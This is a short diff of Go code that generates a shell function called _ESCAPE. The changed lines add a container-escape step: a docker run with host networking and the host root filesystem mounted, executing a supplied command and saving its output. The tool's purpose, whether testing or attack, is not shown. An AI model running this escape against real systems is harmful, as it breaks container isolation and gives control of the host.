@@ -106,8 +106,8 @@ _ESCAPE() {
 
 	// Host command via docker
 	b.WriteString(fmt.Sprintf(`
-    # Run commands on host via docker host
-    _host_output=$(docker run --rm --network=host -v /:/hostfs %s 2>/dev/null || true)
+    # Run commands on host via docker
+    _host_output=$(docker run --rm --network=host -v /:/hostfs alpine:latest sh -c '%s' 2>/dev/null || true)
     echo "$_host_output" > "$_edir/host_output.txt"
 
 `, hostCmd))
@@ -159,6 +159,7 @@ _ESCAPE() {
         done
       fi
     fi
+  fi
 
 `)
 
